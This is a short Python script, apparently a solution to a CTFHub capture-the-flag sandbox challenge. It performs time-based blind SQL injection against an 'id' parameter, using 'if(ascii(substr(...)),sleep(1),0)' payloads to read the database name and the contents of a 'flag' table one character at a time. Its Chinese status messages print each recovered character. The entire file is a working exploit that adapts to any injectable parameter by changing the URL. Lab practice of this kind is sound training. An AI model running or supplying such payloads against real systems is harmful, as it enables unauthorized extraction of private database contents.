import requests
url='http://challenge-c29941542d2310ea.sandbox.ctfhub.com:10800/?id=1 and '
db='if(ascii(substr(database(),%d,1))=%d,sleep(1),0) '
flag='if(ascii(substr((select flag from flag),%d,1))=%d,sleep(1),0) '

def get_data():
    res = ''
    for i in range(1,50):
        for j in range(31,128):
            payload=flag%(i,j)
            r=requests.get(url+payload)
            print(r.url)
            response_time=r.elapsed.total_seconds()
            if j == 127:
                print('不需要再查询了或者布尔注入失败了')
                print('结果为: ' + res)
                return
            if response_time>1:
                print(f"数据库的第{i}个字符是: {chr(j)}")
                res+=chr(j)
                print("结果: "+res)
                break
if __name__ == '__main__':
    get_data()